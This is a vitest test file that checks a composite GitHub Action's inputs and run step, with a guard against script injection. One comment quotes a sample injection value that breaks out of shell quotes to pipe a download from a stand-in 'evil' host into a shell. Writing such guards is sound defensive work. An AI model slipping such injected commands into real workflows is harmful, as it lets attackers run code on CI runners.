import { describe, it, expect } from 'vitest';
import { readFileSync } from 'node:fs';
import { fileURLToPath } from 'node:url';
import { parse as parseYaml } from 'yaml';

// Validate the reusable composite Action's contract so the bin path / input
// wiring can't drift. speclock's CI dogfoods the action (the `self-gate` job).
interface ActionYml {
  runs: {
    using: string;
    steps: Array<{
      run?: string;
      'working-directory'?: string;
      env?: Record<string, string>;
    }>;
  };
  inputs: Record<string, { default?: string }>;
}

const action = parseYaml(
  readFileSync(fileURLToPath(new URL('../action.yml', import.meta.url)), 'utf8'),
) as ActionYml;

describe('reusable GitHub Action', () => {
  it('[SL-15] is a composite action exposing runner/dir/working-directory inputs', () => {
    expect(action.runs.using).toBe('composite');
    for (const key of ['runner', 'dir', 'working-directory']) {
      expect(action.inputs[key], `missing input: ${key}`).toBeDefined();
    }
    expect(action.inputs.runner!.default).toBe('vitest');
  });

  it('[SL-15] runs `speclock check` from the built CLI, honoring the inputs', () => {
    const runStep = action.runs.steps.find(
      (s) => typeof s.run === 'string' && s.run.includes('dist/cli/index.js'),
    );
    expect(runStep, 'no step invokes dist/cli/index.js').toBeDefined();
    expect(runStep!.run).toContain('check');
    // Untrusted inputs reach the script via the environment and are referenced
    // as shell variables — they must NOT be interpolated with ${{ }} directly
    // into the run block (script injection: a value like '"; curl evil | sh; "'
    // would break out of the quotes). Inputs are still honored, via env.
    expect(runStep!.run).toContain('"$SPECLOCK_RUNNER"');
    expect(runStep!.run).toContain('"$SPECLOCK_DIR"');
    expect(runStep!.env?.SPECLOCK_RUNNER).toContain('inputs.runner');
    expect(runStep!.env?.SPECLOCK_DIR).toContain('inputs.dir');
    // Security regression guard: no direct interpolation of inputs in the script.
    expect(runStep!.run).not.toContain('inputs.runner');
    expect(runStep!.run).not.toContain('inputs.dir');
    // The step must run in the caller's project dir (regression for review #9).
    expect(runStep!['working-directory']).toBe('${{ inputs.working-directory }}');
  });
});
